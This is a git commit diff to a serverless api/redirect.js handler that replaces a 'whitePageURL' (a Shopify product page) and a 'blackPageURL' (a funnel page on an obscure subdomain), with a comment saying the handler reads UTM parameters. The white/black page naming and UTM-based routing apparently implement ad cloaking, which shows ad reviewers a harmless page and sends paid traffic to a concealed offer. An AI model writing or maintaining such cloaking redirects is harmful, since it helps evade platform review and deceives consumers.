4af72a69f0bd478c264730f5c93d8e75d3b79af6
abdullahstackwise <aabdullahnaeem.rana@gmail.com>
2025-02-25 23:52:27 +0500

    Update redirect.js

--- api/redirect.js
+++ api/redirect.js
@@ -1,7 +1,7 @@
 export default function handler(req, res) {
     // URLs to redirect
-    const whitePageURL = "https://thebagshop-1804.myshopify.com/products/50l-large-capacity-man-army-tactical-backpacks-military-assault-bags-outdoor-3p-edc-molle-pack-for-trekking-camping-hunting-bag";
-    const blackPageURL = "https://suqiqwopzxkasuewq.myfunnelish.com/imbassd-1735826861886254";
+    const whitePageURL = "https://sleek-inove.myshopify.com/products/knitting-lounge-chair";
+    const blackPageURL = "https://suqiqwopzxkasuewq.myfunnelish.com/jj-dd-spr-1738364604529104-1738364997483090-1739239513447558";
   
     // Parse the UTM parameters from the request URL
     const queryParams = new URLSearchParams(req.url.split('?')[1]);
